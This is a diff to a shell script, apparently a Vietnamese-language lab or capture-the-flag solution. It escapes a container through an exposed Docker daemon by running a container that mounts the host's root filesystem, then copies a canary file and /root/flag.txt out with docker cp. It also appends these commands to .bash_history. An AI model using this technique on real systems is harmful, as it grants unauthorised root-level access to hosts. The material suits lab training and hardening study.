@@ -37,11 +37,13 @@ docker -H "$DHOST" ps
 echo "[*] docker -H $DHOST images"
 docker -H "$DHOST" images
 
-echo "docker -H $DHOST run --rm -v /:/host escimg chroot /host sh -c 'cat /root/.hostmarker'" >> "$HOME/.bash_history"
+echo "docker -H $DHOST run -d --name esc -v /:/host escimg sleep 300" >> "$HOME/.bash_history"
+echo "docker -H $DHOST cp esc:/host/root/.hostmarker ~/host_evidence.txt" >> "$HOME/.bash_history"
 
-echo "[*] doc canary /root/.hostmarker cua host-sim qua container moi (escimg)"
-docker -H "$DHOST" run --rm -v /:/host escimg chroot /host sh -c 'cat /root/.hostmarker' \
-    > "$HOME/host_evidence.txt"
+echo "[*] tao container escimg mount toan bo rootfs host-sim (-v /:/host), lay canary qua 'docker cp'"
+docker -H "$DHOST" rm -f esc >/dev/null 2>&1
+docker -H "$DHOST" run -d --name esc -v /:/host escimg sleep 300 >/dev/null 2>&1
+docker -H "$DHOST" cp esc:/host/root/.hostmarker "$HOME/host_evidence.txt" 2>/dev/null
 cat "$HOME/host_evidence.txt"
 
 echo
@@ -53,9 +55,9 @@ echo "    flag la Nhiem vu 2 (docker.sock). Xem giai thich trong tai lieu huong 
 
 echo
 echo "=== [4/5] get_flag ==="
-docker -H "$DHOST" run --rm -v /:/host escimg chroot /host sh -c 'cat /root/flag.txt' \
-    > "$HOME/flag_result.txt"
+docker -H "$DHOST" cp esc:/host/root/flag.txt "$HOME/flag_result.txt" 2>/dev/null
 cat "$HOME/flag_result.txt"
+docker -H "$DHOST" rm -f esc >/dev/null 2>&1
 
 echo
 echo "=== [5/5] harden_container ==="
